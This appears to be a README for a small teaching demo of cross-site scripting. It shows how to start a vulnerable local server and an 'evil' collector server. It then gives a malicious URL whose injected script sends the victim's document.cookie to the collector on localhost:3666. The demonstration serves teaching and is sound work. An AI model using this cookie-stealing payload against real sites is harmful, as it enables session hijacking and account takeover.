# XSS Attack demo

This quick implementation demonstrates XSS in action.

1 - Start the real server:

```
cd realserver

npm i
node app.js
```

2 - In a new terminal session, start the evil server 👹:

```
cd evilserver

npm i
node evil.js
```

3 - In a web browser, send the malicious request:

```
http://localhost:3000?txid=TX999<script>new Image().src=`http://localhost:3666/evil?cookie=${document.cookie}`</script>
```

The cookie information will be sent to the malicious destination.
